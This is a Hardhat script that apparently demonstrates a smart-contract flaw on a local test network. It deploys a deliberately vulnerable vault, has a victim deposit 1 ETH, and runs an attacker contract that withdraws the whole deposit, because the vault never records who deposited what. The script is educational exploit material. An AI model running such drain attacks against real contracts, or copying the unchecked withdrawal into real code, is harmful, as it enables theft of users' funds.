const { ethers } = require("hardhat");

async function main() {
  const provider = ethers.provider;
  const signers = await ethers.getSigners();

  const victim = signers[0];
  const attackerEOA = signers[1] || signers[0];

  console.log("Victim address:   ", victim.address);
  console.log("Attacker EOA:     ", attackerEOA.address);
  console.log("--------------------------------------------------");

  // 1) Deploy the vulnerable vault from the victim account
  const Vault = await ethers.getContractFactory("VulnerableVault", victim);
  const vault = await Vault.deploy();
  await vault.waitForDeployment();
  const vaultAddress = await vault.getAddress();
  console.log("VulnerableVault deployed at:", vaultAddress);

  // 2) Victim deposits 1 ETH into the vault
  const depositAmount = ethers.parseEther("1.0");
  console.log(
    `\nVictim deposits ${ethers.formatEther(depositAmount)} ETH into the vault...`
  );
  const depositTx = await vault
    .connect(victim)
    .deposit({ value: depositAmount });
  await depositTx.wait();

  // 3) Deploy attacker contract from the attacker EOA
  const Attacker = await ethers.getContractFactory("Attacker", attackerEOA);
  const attackerContract = await Attacker.deploy(vaultAddress);
  await attackerContract.waitForDeployment();
  const attackerContractAddress = await attackerContract.getAddress();
  console.log("Attacker contract deployed at:", attackerContractAddress);

  async function logBalances(label) {
    const vaultBal = await provider.getBalance(vaultAddress);
    const attackerContractBal = await provider.getBalance(
      attackerContractAddress
    );
    const attackerEOABal = await provider.getBalance(attackerEOA.address);

    console.log(`\n== ${label} ==`);
    console.log(
      "Vault balance (ETH):             ",
      ethers.formatEther(vaultBal)
    );
    console.log(
      "Attacker CONTRACT balance (ETH): ",
      ethers.formatEther(attackerContractBal)
    );
    console.log(
      "Attacker EOA balance (ETH):      ",
      ethers.formatEther(attackerEOABal)
    );
  }

  await logBalances("Before attack");

  // 4) Run the attack: attacker withdraws the full 1 ETH
  console.log(
    `\nAttacker calls attack(${ethers.formatEther(
      depositAmount
    )} ETH) on the vault...`
  );
  const attackTx = await attackerContract
    .connect(attackerEOA)
    .attack(depositAmount);
  await attackTx.wait();

  await logBalances("After attack");

  console.log(`
Explanation:
- The victim deposited 1 ETH into VulnerableVault.
- The vault never tracked who deposited what.
- The Attacker contract simply calls withdraw(1 ETH).
- Because the only check is "does the vault have enough ETH?",
  the attacker successfully drains the victim's deposit.
`);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
